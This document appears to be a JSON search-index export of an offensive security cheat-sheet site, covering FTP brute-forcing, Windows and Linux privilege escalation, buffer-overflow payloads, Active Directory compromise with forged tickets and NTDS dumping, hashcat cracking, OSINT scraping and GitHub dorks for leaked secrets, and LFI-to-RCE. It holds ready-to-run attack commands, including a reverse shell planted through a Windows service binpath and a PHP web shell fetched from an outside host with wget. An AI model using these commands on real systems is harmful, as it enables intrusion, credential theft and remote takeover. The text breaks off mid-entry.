[
{
	"uri": "/recon-enumeration/services-enumeration/21_ftp/",
	"title": "21 - FTP",
	"tags": [],
	"description": "",
	"content": " Identification # Base connection ftp \u0026lt;IP\u0026gt; \u0026gt; USER Anonymous \u0026gt; PASS test # It can be usefull to try passive mode ftp -p \u0026lt;IP\u0026gt; \u0026gt; USER Anonymous \u0026gt; PASS test # Using telnet telnet \u0026lt;IP\u0026gt; 21 Anonymous test bin (binary mode, don\\\u0026#39;t forget it before transfering exe file) get / send # FTP Web Access ? # Try upload and execute through web access ftp://IP \nBruteforce `bash hydra -L users.txt -P passwords.txt -t 3 -s 21 IP ftp \n"
},
{
	"uri": "/windows-systems/privilege-escalation/admin_processes/",
	"title": "Admin and Processes",
	"tags": [],
	"description": "",
	"content": " Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results \nSessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.txt) DO @echo [+] Querying DC %i \u0026amp;\u0026amp; @netsess -h %i 2\u0026gt;nul \u0026gt; sessions.txt \u0026amp;\u0026amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a \nProcesses owners net group “Domain Admins” /domain (build admins.txt with it) FOR /F %i in (ips.txt) DO @echo [+] %i \u0026amp;\u0026amp; @tasklist /V /S %i /U user /P password 2\u0026gt;NUL \u0026gt; output.txt \u0026amp;\u0026amp; FOR /F %n in (admins.txt) DO @type output.txt | findstr %n \u0026gt; NUL \u0026amp;\u0026amp; echo [!] %n was found running a process on %i \u0026amp;\u0026amp; pause \nScanning remote system using NBT net group “Domain Admins” /domain (build admins.txt with it) for /F %i in (ips.txt) do @echo [+] Checking %i \u0026amp;\u0026amp; nbtstat -A %i 2\u0026gt;NUL \u0026gt;nbsessions.txt \u0026amp;\u0026amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n \u0026gt; NUL \u0026amp;\u0026amp; echo [!] %n was found logged into %i # OR if nbtscan uploaded: for /F %i in (ips.txt) do @echo [+] Checking %i \u0026amp;\u0026amp; nbtscan -f %i 2\u0026gt;NUL \u0026gt;nbsessions.txt \u0026amp;\u0026amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n \u0026gt; NUL \u0026amp;\u0026amp; echo [!] %n was found logged into %i"
},
{
	"uri": "/recon-enumeration/application-scans/",
	"title": "Applications Scans",
	"tags": [],
	"description": "",
	"content": " Table of Content  Application Scans Ports Scanning Services enumeration  "
},
{
	"uri": "/linux-systems/programing-languages/bash/",
	"title": "Bash",
	"tags": [],
	"description": "",
	"content": " General \u0026amp; Tricks # base program int main(void) { system(\u0026#34;ls /path/to/.passwd\u0026#34;); return 0; } # As you as the program is executed with the ‘s’ flag (owner rights), you can privesc by copying the program you want to impersonate cp /bin/cat /tmp/ls PATH=/tmp # You can escape options echo \u0026#39;#!/bin/cat --\u0026#39; \u0026gt; /tmp/ls chmod 755 /tmp/ls env PATH=/tmp ./binary_setuid .passwd \nSymbolic link attack # base program int main(void) { system(\u0026#34;ls /path/to/.passwd\u0026#34;); return 0; } ln -s /bin/cat /tmp/ls ls -l /tmp/ls PATH=/tmp echo $PATH ./binary1"
},
{
	"uri": "/pwn/buffer-overflow/",
	"title": "Buffer Overflow (BoF)",
	"tags": [],
	"description": "",
	"content": " Table of Content  Buffer Overflow  "
},
{
	"uri": "/open-source-intelligence-osint/technical-recon/domain_ip/",
	"title": "Domain &amp; IP",
	"tags": [],
	"description": "",
	"content": " Identification Get information on an IP whois \u0026lt;IP\u0026gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Bing dorks to identify host sharing ip:xxx.xxx.xxx.xxx \nOnline Passive Identification Tools # Many passive tests can be done http://www.ipvoid.com/ # Informations about the target https://securitytrails.com/ # When you have a name or a e-mail adress you can perform a reverse whois lookup to find domain # names oned by a person of a company https://viewdns.info/reversewhois/ # Get information about the target IP https://www.onyphe.io/ # Shodan.io and Censys.io are also usefull # Robtex is a great and complete tool https://www.robtex.com \nr3con1z3r (https://github.com/abdulgaphy/r3con1z3r) # OSINT Tool used to perform some OSINT tests and generates a report # HTTP Headers, Whois, Traceroute, DNS, nmap, website on the same server, Reverse IP, Page Links # Take care, not really passiv ./r3con1z3r.py google.com \nTarget Mapping # Mapping the target website can be good to get an overview www.visualsitemapper.com # Getting site technology https://builtwith.com/sodifrance.fr \nDomain spoofing # Tools like spoofcheck (https://github.com/BishopFox/spoofcheck) # It checks SPF and DMARC records for weak configuration that allow domain spoofing # Domain is spoofable if lack of an SPF or DMARC record, SPF record never specifies ~all or -all, DMARC policy is set to p=none or is nonexistent ./spoofcheck.py [DOMAIN] \nScrapping from JS # You can parse and scrape javascript content in a target website to look for hidden subdomains or interesting paths # Often, endpoints are not public but users can still interact with them # Tools like dirscraper automates this (https://github.com/Cillian-Collins/dirscraper) # Classic python discraper.py -u \u0026lt;url\u0026gt; # Output mode python discraper.py -u \u0026lt;url\u0026gt; -o \u0026lt;output\u0026gt; # Silent mode (you won\u0026#39;t see result in term) python discraper.py -u \u0026lt;url\u0026gt; -s -o \u0026lt;output\u0026gt; # Relative URL Extractor is another good tool to scrape from JS files (https://github.com/jobertabma/relative-url-extractor) ruby extract.rb https://hackerone.com/some-file.js \nMore Information Gathering # EyeWitness (https://github.com/FortyNorthSecurity/EyeWitness) # It can take screenshots of websites, RDP services and open VNC servers, provide some server header info and identify defualt credentials ./EyeWitness.py -f filename --timeout optionaltimeout --open (Optional) ./EyeWitness -f urls.txt --web ./EyeWitness -x urls.xml --timeout 8 --headless ./EyeWitness -f rdp.txt --rdp# XRay tool (https://github.com/evilsocket/xray) # Bruteforce subdomains using wordlist and DNS requests, then Shodan, then ViewDNS is key is provided. # Then it will launch banner grabbing and info collectors (not passiv) xray -shodan-key yadayadayadapicaboo... -viewdns-key foobarsomethingsomething... -domain fbi.gov"
},
{
	"uri": "/pwn/buffer-overflow/easy_no_protection/",
	"title": "Easy - No Protections",
	"tags": [],
	"description": "",
	"content": " Simple Buffer Overflow (no protection) - Function call # Code void copy_ordre(char *arg) { char ordre[50]; strcpy(ordre,arg); printf(\u0026#34;\\nOrdre reçu : %s\\n\\n\u0026#34;,ordre); } int main(int argc, char** argv) { if(argc \u0026lt; 2) { printf(\u0026#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons. Le cas échéant, nous détruirons la terre.\\n\u0026#34;); printf(\u0026#34;Usage: %s \u0026lt;ordre\u0026gt;\\n\u0026#34;, argv[0]); exit(0); } printf(\u0026#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons. Le cas échéant, nous détruirons la terre.\\n\u0026#34;); copy_ordre(argv[1]); earth_destroy(); return 0; } void earth_destroy() { printf(\u0026#34;Mauvaise réponse ! Nous détruirons votre planète dans quelques minutes.\\n\u0026#34;); } void earth_alive() { printf(\u0026#34;Nous nous avouons vaincu. Vous avez gagné, nous vous rendons la terre !\\n\u0026#34;); execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); }# Explanations and Exploit # The goal is to call earth_alive() function # The buffer is 50 bytes long, so by submitting 50+ char, you can override what is after # You have EIP, EBP and one argument (char) on the stack, so 12 bytes # So, to override what you want and call the function, you will need to send 62 char before the payload # The payload is the function adress you want to send $ nm ./pwn1 | grep \u0026#34;earth_alive\u0026#34; 08048acb T earth_alive # So, the payload will be the following ./pwn1 $(python -c \u0026#39;print \u0026#34;A\u0026#34;*62 + \u0026#34;\\xcb\\x8a\\x04\\x08\u0026#34;\u0026#39;) \nSimple BoF - Int override # Code int main() { char buf[20]; int x = 0; gets(buf); if (x == 1234) { // gid_t gid = getegid(); // setresgid(gid, gid, gid);  FILE *fp; fp = fopen(\u0026#34;flag.txt\u0026#34;, \u0026#34;r\u0026#34;); char flag[64]; fgets(flag, 64, (FILE*) fp); printf(\u0026#34;Oh, un flag : %s\\n\u0026#34;, flag); } printf(\u0026#34;x value : %d\\n\u0026#34;, x); return 0; }# Exploitation and Explanations # You want to override the “x” value # In the stack, 20 bytes are allowed to the buffer and 4 bytes are allowed to a pointer for this buffer. # After that comes the value of x, so you can overflow here $ python -c \u0026#39;print \u0026#34;a\u0026#34;*24 + \u0026#34;\\xd2\\x04\\x00\\x00\u0026#34;\u0026#39; | ./pwn0 $ python -c \u0026#39;print \u0026#34;a\u0026#34;*24 + \u0026#34;\\xd2\\x04\u0026#34;\u0026#39; | ./pwn0 $ python -c \u0026#39;print \u0026#34;a\u0026#34;*22 + \u0026#34;\\x00\\x00\\xd2\\x04\u0026#34;\u0026#39; | ./pwn0"
},
{
	"uri": "/windows-systems/exploitation/exploitation_tricks/",
	"title": "Exploitation Tricks",
	"tags": [],
	"description": "",
	"content": " From non-auth user to local admin in 3 steps # Nullsession net use \\\\dc\\ipc$ \u0026#34;\u0026#34; /u:\u0026#34;\u0026#34; # Search for cpasswords in gpo\u0026#39;s: dir \\\\dc\\sysvol\\contoso.corp\\Policies -r -I *.xml | Select-String cPassword \u0026gt;\u0026gt; dump.txt # Decrypt the cPassword gpp-decrypt \u0026lt;string\u0026gt; \nGetting and cracking LDPA user hash # STEP 1: Dump target user hash: ldapsearch –x –h \u0026lt;LDAP_IPAddr\u0026gt; -D \u0026#34;cn=Directory Manager\u0026#34; -w \u0026lt;password\u0026gt; -b \u0026#39;uid=\u0026lt;target_username\u0026gt;,cn=users,cn=accounts,dc=\u0026lt;DOMAIN\u0026gt;,dc=COM\u0026#39; uid userpassword krbprincipalkey sambalmpassword sambantpassword # STEP 2: The ‘userpassword::’ and ‘krbprincipalkey::’ hash is base64 encoded and now you need to decode it: echo \u0026#39;e1NTSEF9dHZEaUZ4ejJTUkRBLzh1NUZSSGVIT2N4WkZMci9OYktQNHNLNWc9PQ==\u0026#39; | base64 --decode {SSHA}tvDiFxz2SRDA/8u5FRHeHOcxZFLr/NbKP4sK5g== # STEP 3: Place your decoded hash into hash.txt file and fire up Hashcat mode ‘111’ and attempt to crack the password hash: hashcat –a 0 –m 111 hash.txt dict.txt \nFrom one domain to another # Hash/password replay to find one user on the second domain $ crackmapexec smb \u0026lt;ip\u0026gt; -u user -p -H hash --shares $ impacket/examples/smbclient DOMAIN/USER@IP -hashes \u0026lt;hash\u0026gt; # Look for things like automated tasks ran by admins # Write access # net user foo fooPassword /add /y # net group \u0026#34;Domain Admins\u0026#34; foo /add $ psexec.py domain/user@ip # Test trust relationship $ nltest /trusted_domain $ nltest /dclist:\u0026lt;domain\u0026gt; # Create a new ticket for the second domain with the extra-sid # nthash → krbtgt compromised hash # domain-sid → compromised domain SID # domain → Already compromissed domain # extra-sid → Target domain (+519 = enterprise admin) $ ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519 # Exec and use the ticket $ /impacket/examples/psexec.py -k -n -debug DOMAIN/user@host_DC # Dump NTDS $ proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss # look for the admin workstation # go RDP (or psexec also) $ crackmapexec smb \u0026lt;ip\u0026gt; -u user -H hash -M rdp -o ACTION=enable"
},
{
	"uri": "/open-source-intelligence-osint/general/firefox_addons/",
	"title": "Firefox addons",
	"tags": [],
	"description": "",
	"content": " Flag Fox Flagfox is an extension that displays a flag icon indicating the current webserver\u0026rsquo;s physical location.\nIt then launch a geotool webpage to get more informations about the website you are visiting About IP \u0026amp; Domain.\nGoogle Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.\nIf the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.\nLink Gopher Extracts all links from web page, sorts them, removes duplicates, and displays them in a new tab for copy and paste into other systems.\nAlso extracts embedded, referrertype links in the format http://www.example.com/go?url=http://www.example.com/foo\nAlso displays a distilled list of unique domain names used in the links.\nSputnik Complete OSINT web extension.\nRightclick on a link and you can request many resources for the IP, domain or URL.\nVirus total, Shodan, Onyphe\u0026hellip;\nTinEye Reverse Image Search TinEye is a reverse image search engine.\nThe extension adds a context menu item so you can search for an image to find out where it came from.\nHow it is being used, if modified versions of the image exist, or to find higher resolution versions.\nWho stole my pictures? Search for copies of the images using Yandex.ru, Tineye.com, Google.com, Baidu.com, Bing.com and VK.com via right click menu.\n"
},
{
	"uri": "/open-source-intelligence-osint/general/",
	"title": "General",
	"tags": [],
	"description": "",
	"content": "Everything that is related to general information such as usefull firefox add-ons for OSINT.\n"
},
{
	"uri": "/open-source-intelligence-osint/hosting-and-repositories/github/",
	"title": "Github",
	"tags": [],
	"description": "",
	"content": " Finding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxxxxx/events/public # And search for “email” ------------------------ # Method 2 # Go for user repositories # Find one repo and go checks commits # Take one commit https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2 # Add .patch at the end and check for email https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2.patch \nGitrob # Gitrob is a github scanner and crawler # Can be used to retrieve sensitive data in github repositories https://michenriksen.com/blog/gitrob-putting-the-open-source-in-osint/ https://github.com/michenriksen/gitrob # First step : Collecting all public repositories of the organization # Then it goes on organization members and all their repo # It proceeds files to gather filenames and run them through filters to detect sensitive files # It will then start a Sinatra web server locally go get github.com/michenriksen/gitrob or precompiled binaries \nGitMiner # Advanced search tool and automation in Github. # This tool aims to facilitate research by code or code # snippets on github through the site\u0026#39;s search page. # Demonstrates the fragility of trust in public repositories to store codes with sensitive information. https://github.com/UnkL4b/GitMiner # Options -m --- Specify the search module -c --- Specify the cookie for your Github -q --- Speficy search terms # Searching for wordpress configuration files with passwords python3 gitminer-v2.0.py -q \u0026#39;filename:wp-config extension:php FTP_HOST in:file \u0026#39; -m wordpress -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 -o result.txt # Looking for brasilian government files containing passwords python3 gitminer-v2.0.py --query \u0026#39;extension:php \u0026#34;root\u0026#34; in:file AND \u0026#34;gov.br\u0026#34; in:file\u0026#39; -m senhas -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 # Looking for shadow files on the etc paste python3 gitminer-v2.0.py --query \u0026#39;filename:shadow path:etc\u0026#39; -m root -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 # Searching for joomla configuration files with passwords python3 gitminer-v2.0.py --query \u0026#39;filename:configuration extension:php \u0026#34;public password\u0026#34; in:file\u0026#39; -m joomla -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 # Interesting queries | Dork | Description | | filename:.npmrc _auth | npm registry authentication data | | filename:.dockercfg auth | docker registry authentication data | | extension:pem private | private keys | | extension:ppk private | puttygen private keys | | filename:id_rsa or filename:id_dsa | private ssh keys | | extension:sql mysql dump | mysql dump | | extension:sql mysql dump password | mysql dump look for password; you can try varieties | | filename:credentials aws_access_key_id | might return false negatives with dummy values | | filename:.s3cfg | might return false negatives with dummy values | | filename:wp-config.php | wordpress config files | | filename:.htpasswd | htpasswd files | | filename:.env DB_USERNAME NOT homestead | laravel .env (CI, various ruby based frameworks too) | | filename:.env MAIL_HOST=smtp.gmail.com | gmail smtp configuration (try different smtp services too) | | filename:.git-credentials | git credentials store, add NOT username for more valid results | | PT_TOKEN language:bash | pivotaltracker tokens | | filename:.bashrc password | search for passwords, etc. in .bashrc (try with .bash_profile too) | | filename:.bashrc mailchimp | variation of above (try more variations) | | filename:.bash_profile aws | aws access and secret keys | | rds.amazonaws.com password | Amazon RDS possible credentials | | extension:json api.forecast.io | try variations, find api keys/secrets | | extension:json mongolab.com | mongolab credentials in json configs | | extension:yaml mongolab.com | mongolab credentials in yaml configs (try with yml) | | jsforce extension:js conn.login | possible salesforce credentials in nodejs projects | | SF_USERNAME salesforce | possible salesforce credentials | | filename:.tugboat NOT _tugboat | Digital Ocean tugboat config | | HEROKU_API_KEY language:shell | Heroku api keys | | HEROKU_API_KEY language:json | Heroku api keys in json files | | filename:.netrc password | netrc that possibly holds sensitive credentials | | filename:_netrc password | netrc that possibly holds sensitive credentials | | filename:hub oauth_token | hub config that stores github tokens | | filename:robomongo.json | mongodb credentials file used by robomongo | | filename:filezilla.xml Pass | filezilla config file with possible user/pass to ftp | | filename:recentservers.xml Pass | filezilla config file with possible user/pass to ftp | | filename:config.json auths | docker registry authentication data | | filename:idea14.key | IntelliJ Idea 14 key, try variations for other versions | | filename:config irc_pass | possible IRC config | | filename:connections.xml | possible db connections configuration, try variations to be specific | | filename:express.conf path:.openshift | openshift config, only email and server thou | | filename:.pgpass | PostgreSQL file which can contain passwords | | filename:proftpdpasswd | Usernames and passwords of proftpd created by cpanel | | filename:ventrilo_srv.ini | Ventrilo configuration | | [WFClient] Password= extension:ica | WinFrame-Client infos needed by users to connect toCitrix Application Servers | | filename:server.cfg rcon password | Counter Strike RCON Passwords | | JEKYLL_GITHUB_TOKEN | Github tokens used for jekyll | | filename:.bash_history | Bash history file | | filename:.cshrc | RC file for csh shell | | filename:.history | history file (often used by many tools) | | filename:.sh_history | korn shell history | | filename:sshd_config | OpenSSH server config | | filename:dhcpd.conf | DHCP service config | | filename:prod.exs NOT prod.secret.exs | Phoenix prod configuration file | | filename:prod.secret.exs | Phoenix prod secret | | filename:configuration.php JConfig password | Joomla configuration file | | filename:config.php dbpasswd | PHP application database password (e.g., phpBB forum software) | | path:sites databases password | Drupal website database credentials | | shodan_api_key language:python | Shodan API keys (try other languages too) | | filename:shadow path:etc | Contains encrypted passwords and account information of new unix systems | | filename:passwd path:etc | Contains user account information including encrypted passwords of traditional unix systems | | extension:avastlic | Contains license keys for Avast! Antivirus | | extension:dbeaver-data-sources.xml | DBeaver config containing MySQL Credentials | | filename:.esmtprc password | esmtp configuration | | extension:json googleusercontent client_secret | OAuth credentials for accessing Google APIs | | HOMEBREW_GITHUB_API_TOKEN language:shell | Github token usually set by homebrew users | | xoxp OR xoxb | Slack bot and private tokens | | .mlab.com password | MLAB Hosted MongoDB Credentials | | filename:logins.json | Firefox saved password collection (key3.db usually in same repo) | | filename:CCCam.cfg | CCCam Server config file | | msg nickserv identify filename:config | Possible IRC login passwords | | filename:settings.py SECRET_KEY | Django secret keys (usually allows for session hijacking, RCE, etc) |"
},
{
	"uri": "/passcracking-hashfiles/hashcat_cheatsheet/",
	"title": "Hashcat Cheatsheet",
	"tags": [],
	"description": "",
	"content": " MISC and tricks https://www.notsosecure.com/one-rule-to-rule-them-all/# MAX POWER # force the CUDA GPU interface, optimize for \u0026lt;32 char passwords and set the workload to insane (-w 4). # It is supposed to make the computer unusable during the cracking process # Finnally, use both the GPU and CPU to handle the cracking --force -O -w 4 --opencl-device-types 1,2 \nAttack modes -a 0 # Straight : hash dict -a 1 # Combination : hash dict dict -a 3 # Bruteforce : hash mask -a 6 # Hybrid wordlist + mask : hash dict mask -a 7 # Hybrid mask + wordlist : hash mask dict \nCharsets ?l # Lowercase a-z ?u # Uppercase A-Z ?d # Decimals ?h # Hex using lowercase chars ?H # Hex using uppercase chars ?s # Special chars ?a # All (l,u,d,s) ?b # Binary \nOptions -m # Hash type -a # Attack mode -r # Rules file -V # Version --status # Keep screen updated -b # Benchmark --runtime # Abort after X seconds --session [text] # Set session name --restore # Restore/Resume session -o filename # Output to filename --username # Ignore username field in a hash --potfile-disable # Ignore potfile and do not write -d # Specify an OpenCL Device -D # Specify an OpenCL Device Type -l # List OpenCL Devices \u0026amp; Types -O # Optimized Kernel, Passwords \u0026lt;32 chars -i # Increment (bruteforce) --increment-min # Start increment at X chars --increment-max # Stop increment at X chars \nExamples # Benchmark MD4 hashes hashcat -b -m 900 # Create a hashcat session to hash Kerberos 5 tickets using wordlist hashcat -m 13100 -a 0 --session crackin1 hashes.txt wordlist.txt -o output.pot # Crack MD5 hashes using all char in 7 char passwords hashcat -m 0 -a 3 -i hashes.txt ?a?a?a?a?a?a?a -o output.pot # Crack SHA1 by using wordlist with 2 char at the end hashcat -m 100 -a 6 hashes.txt wordlist.txt ?a?a -o output.pot # Crack WinZip hash using mask (Summer2018!) hashcat -m 13600 -a 3 hashes.txt ?u?l?l?l?l?l?l?d?d?d?d! -o output.pot # Crack MD5 hashes using dictionnary and rules hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rules # Crack MD5 using combinator function with 2 dictionnaries hashcat -a 1 -m 0 example0.hash example.dict example.dict # Cracking NTLM hashes hashcat64 -m 1000 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\\hashsample.hash \u0026#34;d:\\WORDLISTS\\realuniq.lst\u0026#34; -r OneRuleToRuleThemAll.rule # Cracking hashes from kerberoasting hashcat64 -m 13100 -a 0 -w 4 --force --opencl-device-types 1,2 -O d:\\krb5tgs.hash d:\\WORDLISTS\\realhuman_phill.txt -r OneRuleToRuleThemAll.rule# You can use hashcat to perform combined attacks # For example by using wordlist + mask + rules hashcat -a 6 -m 0 prenoms.txt ?d?d?d?d -r rules/yourule.rule # Single rule used to uppercase first letter --\u0026gt; Marie2018 hashcat -a 6 -m 0 prenoms.txt ?d?d?d?d -j \u0026#39;c\u0026#39;"
},
{
	"uri": "/other-systems/todo/",
	"title": "IPBX",
	"tags": [],
	"description": "",
	"content": "# You can browse to the following URL to get all users registered with an extension 178.33.47.167/panel/ # Sipvicious is a great tool to attack VoIP # You can bruteforce a special extension/account ./svcrack.py -u 2000 178.33.47.167 -d ./notre_dictionnaire -vv"
},
{
	"uri": "/open-source-intelligence-osint/human-recon/social-networks/linkedin/",
	"title": "LinkedIn",
	"tags": [],
	"description": "",
	"content": " ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. # Provide a search string # Ouput as XLSX but intented to work with Google Sheets # After importing you\u0026#39;ll have a dataset and report worksheet # Dataset : First name, last name, occupation, industry, profile URL, picture URL # Report : Picture (displayed), Full name, occupation, Link to profile \nlinkScrape # linkScrape is another enumeration tool # Pure Web Scrapper → It does not use the LinkedIn API # /!\\ Some bugs → LinkedIn account can be banned and needs to have 10 contacts to perform company based searches # For companies with whitespace, use simple quotes # Using a LinkedIn company ID is the most accurate way to search for a company. It\u0026#39;s also the only way to search for universities. python linkScrape.py -c 100 -r1 # To find company ID, go to the company page then \u0026#34;See all numeral employees on LinkedIn → ?facetCurrentCompany=%5B%2239624%22 Usage: python linkScrape.py \u0026lt;OPTIONS\u0026gt; Example[1]: python linkScrape.py -e LinkedInUser@email.com -c \u0026#39;Example Company\u0026#39; -r 10 -t 3 -m 7 -d example.com Example[2]: python linkScrape.py -e LinkedInUser@email.com -c \u0026#39;Example Company\u0026#39; -r 5-10 -t 3 -m 7 -d example.com Example[3]: python linkScrape.py -e LinkedInUser@email.com -c 100 -r 3 -t 3 -m 7 -d example.com Example[4]: python linkScrape.py -m 7 -i ~/Company/names.txt\\n\\\u0026#34; Formatted output saved to: linkedIn/linkScrape-data/Company-mangle[x]_time.txt Login options: -e \u0026lt;email\u0026gt; Your LinkedIn.com Email Address. -p \u0026lt;pass\u0026gt; Your LinkedIn.com Password. (If -p parameter is not defined, you\\\u0026#39;ll be prompt to enter a password) Search options: -c \u0026lt;company\u0026gt; Search company name or company ID. -r \u0026lt;results\u0026gt; Searches X number of LinkedIn.com pages, or a range of pages (Default is 1-3). -t \u0026lt;secs\u0026gt; Sets timeout value. (Default is 3.) \nLinkedin2Username (https://github.com/initstring/linkedin2username) # Pure web scraper used to get username list from the employee list of a company # It will create several lists of possible username formats for all employees of a company you point it at # pull all employees of Uber python linkedin2username.py myname@email.com uber-com # Pull a shorter list and append the domain name @uber.com to them python linkedin2username.py myname@email.com uber-com -d 5 -n \u0026#39;uber.com\u0026#39;"
},
{
	"uri": "/windows-systems/local-and-physical/local_recon_enumeration/",
	"title": "Local Recon and Enumeration",
	"tags": [],
	"description": "",
	"content": " Basics whoami ipconfig type “C:\\Documents and Settings\\Administrator\\Desktop\\proof.txt” echo %username% echo %path% ipconfig /all netstat -ano # Display hidden files dir /a # Recursive dir dir /s # Available ? Ok drop jaws enum tool ! powershell “$var=1” # Possible ? Ok drop windowsprivcheck.py \u0026#34;C:\\Python2X\\python.exe\u0026#34; -c \u0026#34;print \u0026#39;1\u0026#39;\u0026#34; # If x86 ? Drop windows-privesc-check.exe # You can use WinPrivCheck.bat to check common misconfigurations and KB https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat \nEnumeration - Host Information # Exact OS version type C:/Windows/system32/eula.txt type C:\\Windows\\System32\\drivers\\etc\\hosts set hostname whoami echo %username% echo %path% systeminfo net users net localgroup administrators net accounts set DRIVERQUERY \nEnumeration - Network ipconfig /all netstat -ano route print netsh firewall show state netsh firewall show config \nEnumeration - Users \u0026amp; Groups net users dir /b /ad “C:\\Documents and Settings” reg query “HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon” 2\u0026gt;nul | findstr “DefaultUserName DefaultDomainName DefaultPassword” net user alice echo %username% # Get domain powershell\u0026gt; wmic computersystem get domain powershell\u0026gt; systeminfo | findstr /B /C:\u0026#34;Domain\u0026#34; # Domain # /dom could be a way to avoid endpoint solutions detection powershell\u0026gt; net user /dom powershell\u0026gt; net user /domain powershell\u0026gt; net user /domain \u0026lt;username\u0026gt; powershell\u0026gt; net group /domain # Get you own SID powershell\u0026gt; wmic useraccount where name=\u0026#39;\u0026lt;username\u0026gt;\u0026#39; get sid # Get domain SPN $search = New-Object DirectoryServices.DirectorySearcher([ADSI]\u0026#34;\u0026#34;) $search.filter = \u0026#34;(servicePrincipalName=*)\u0026#34; $results = $search.Findall() foreach($result in $results) { $userEntry = $result.GetDirectoryEntry() Write-host \u0026#34;User : \u0026#34; $userEntry.name \u0026#34;(\u0026#34; $userEntry.distinguishedName \u0026#34;)\u0026#34; Write-host \u0026#34;SPNs\u0026#34; foreach($SPN in $userEntry.servicePrincipalName) { $SPN } Write-host \u0026#34;\u0026#34; } # Get user accounts which have SPN $search = New-Object DirectoryServices.DirectorySearcher([ADSI]\u0026#34;\u0026#34;) $search.filter = \u0026#34;(\u0026amp;(objectCategory=person)(objectClass=user)(servicePrincipalName=*))\u0026#34; $results = $search.Findall() foreach($result in $results) { $userEntry = $result.GetDirectoryEntry() Write-host \u0026#34;User : \u0026#34; $userEntry.name \u0026#34;(\u0026#34; $userEntry.distinguishedName \u0026#34;)\u0026#34; Write-host \u0026#34;SPNs\u0026#34; foreach($SPN in $userEntry.servicePrincipalName) { $SPN } Write-host \u0026#34;\u0026#34; } \nEnumeration - Running Processes tasklist /SVC schtasks /query /fo LIST /v net start accesschk_old.exe -uwcqv “Authenticated Users” * /accepteula accesschk_old.exe -ucqv upnphost sc qc upnphost sc config upnphost binpath= “C:\\Windows\\Temp\\nc.exe -nv 10.11.0.179 51337 -e C:\\Windows\\System32\\cmd.exe” sc config upnphost obj= “.\\LocalSystem” password= “” net stop upnphost net start upnphost \nEnumeration - Files dir /a /s *pass* == *cred* == *vnc* == *.config* == *proof.txt* == *local.txt* findstr /si password *.xml *.ini *.txt *.config *.sql *.php *.asp *.jsp *.bat *.vbs 2\u0026gt;nul type “C:\\Documents and Settings\\Administrator\\Desktop\\proof.txt” \nGathering Passwords/Hashes .\\PwDump7.exe (nécessite libay32.dll) =\u0026gt; Dump SAM base .\\mimikatz.exe privilege::debug privilege::backup token::elevate"
},
{
	"uri": "/web-attacks/files-inclusions-and-injections/lfi_rfi/",
	"title": "Local and Remote File Inclusions",
	"tags": [],
	"description": "",
	"content": " Local File Inclusion # Double Encoding page=php://filter/read=convert.base64-encode/resource=conf page%3Dphp%20%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconf page%253Dphp%2520%253A%252F%252Ffilter%252Fread%253Dconvert.base64-encode%252Fresource%253Dconf # Files file:///boot.ini file:///boot.ini%00 file:///boot.ini%2500 file:///etc/passwd file:///etc/passwd%00 file:///etc/passwd%2500 # LFI in HTTP headers curl --header \u0026#34;Accept-Language: php://filter/read=convert.base64-encode/resource=config.php\u0026#34; http://target # LFI to RCE Can you read for a .log file such as: C:\\xampp\\apache\\logs\\access.log ? Then go nc -nv IP 80 Then write: \u0026lt;?php system($_GET[\u0026#39;acknak\u0026#39;]);?\u0026gt; Now access the log file using the LFI and inject system command in acknak parameter !# Checking if proc/self/environ is accessible # If blank page --\u0026gt; NOPE view.php?page=../../../../../proc/self/environ # RCE through User-Agent # Tamper data to /proc/self/environ # You can try exec() too \u0026lt;?system(\u0026#39;wget http://hack-bay.com/Shells/gny.txt -O shell.php\u0026#39;);?\u0026gt; \u0026lt;?system($_GET[\u0026#39;cmd\u0026#39;]);?\u0026gt; view.php?page=../../../../../proc/self/environ?cmd=ls \nWrappers # You can execute PHP through ZIP using PHAR # toto.php in a ZIP renamed in .jpg ?page=phar://tmp/upload/qXE3Rw9eN.jpg/toto # You can use PHP Filter to encode and retrieve content index.php?page=php://filter/convert.base64-encode/resource=index.php%00 # You can use data:// wrapper to send direct commands Payload : \u0026#34;\u0026lt;?php system($_GET[\u0026#39;cmd\u0026#39;]);echo \u0026#39;Shell done !\u0026#39;; ?\u0026gt;\u0026#34; Encoded : PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4= Final request : 